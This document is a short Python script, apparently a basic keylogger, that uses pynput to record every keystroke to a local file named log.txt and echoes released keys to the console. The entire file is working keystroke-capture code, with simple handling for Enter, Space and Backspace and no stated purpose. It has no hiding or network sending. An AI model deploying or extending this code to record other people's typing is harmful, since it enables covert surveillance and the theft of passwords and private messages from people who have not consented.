from pynput.keyboard import Key, Listener
import os

def writefile(key):
    key = str(key)
    key = key.replace("'", "")
    key = key.replace("Key.enter", "\n")
    key = key.replace("Key.space", " ")
    if key == "Key.backspace":
        with open("log.txt", "rb+") as f:
            f.seek(-1, os.SEEK_END)
            f.truncate()
    else:
        with open("log.txt", "a") as f:
            f.write(key)

def onpress(key):
    writefile(key)


def onrelease(key):
    print(key)

with Listener(on_press=onpress, on_release=onrelease) as listener:
    listener.join()